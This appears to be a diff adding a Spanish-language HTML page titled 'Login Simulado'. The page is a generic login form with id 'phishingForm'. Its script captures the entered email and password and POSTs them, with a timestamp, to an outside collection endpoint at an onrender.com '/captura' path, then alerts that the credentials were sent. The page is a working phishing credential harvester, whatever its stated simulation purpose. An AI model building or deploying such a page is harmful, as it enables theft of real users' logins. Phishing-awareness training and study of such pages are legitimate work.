@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Simulado</title>
+</head>
+<body>
+  <h2>Accede a tu cuenta</h2>
+  <form id="phishingForm">
+    <input type="text" name="usuario" placeholder="Correo" required>
+    <input type="password" name="clave" placeholder="Contraseña" required>
+    <button type="submit">Entrar</button>
+  </form>
+  <script>
+    document.getElementById('phishingForm').onsubmit = function(e) {
+      e.preventDefault();
+      fetch('https://backend-prueba-o523.onrender.com/captura', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          usuario: e.target.usuario.value,
+          clave: e.target.clave.value,
+          time: new Date().toISOString()
+        })
+      });
+      alert("Credenciales enviadas");
+    }
+  </script>
+</body>
+</html>
